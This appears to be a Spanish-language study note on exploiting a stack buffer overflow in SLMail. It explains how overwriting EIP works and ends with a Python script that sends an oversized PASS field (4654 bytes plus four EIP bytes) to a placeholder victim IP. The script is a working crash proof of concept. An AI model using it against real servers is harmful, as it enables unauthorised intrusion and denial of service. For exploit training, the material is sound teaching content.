#BufferOverflow #ShellCode #SLMail 

Una vez tenemos calculado el offset(cantidad de caracteres a introducir antes del EIP), si introducimos cuatro caracteres adicionales estos van a estar representados en el *EIP* como direcci√≥n.
Una vez sobrescrito el *EIP* veremos que los datos se almacenan al comienzo de la pila(stack) en el registro *ESP (Extended Stack Pointer)*, este es un registro de la CPU que se utiliza para manejar la pila en un programa.
La pila es una zona de memoria temporal que se utiliza para almacenar valores y *direcciones de retorno* de las funciones a medida que se van llamando al programa.
Una vez identificados estos caracteres en la memoria la idea principal es intro



```python
	#!/usr/bin/python3
	
	import socket
	import sys
	
	#Variables globales
	ip_adress = <IP_Victima>
	port = <Puerto>
	offset = 4654 #Ofset que nos ha dado metasploit
	
	before_eip = b"A"*offset #Cadena de A antes de llegar al offset(valor del EIP)
	eip = b"B"*4 # Cadena con el valor del EIP, es *4 por que es la capacidad del registro EIP
	
	payload = before_eip + eip
	
	#Exploit
	def exploit():
		
		#Crar socket
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		
		#Conectar con el servidor
		s.connect((ip_adress, port))
		
		#Recibir la respuest(banner)
		banner = s.recv(1024)
		
		s.send(b"USER test" + b'\r\n') #Enviamos un usuario en el campo USER aleatorio en este caso TEST
		response = s.recv(1024)
		s.send(b"PASS " + payload + b'\r\n') #En el campo PASS introducira el payload que es igual a 4654 + eip
		s.close()
		
	if __name__ == '__main__':
		
		exploit()
		
```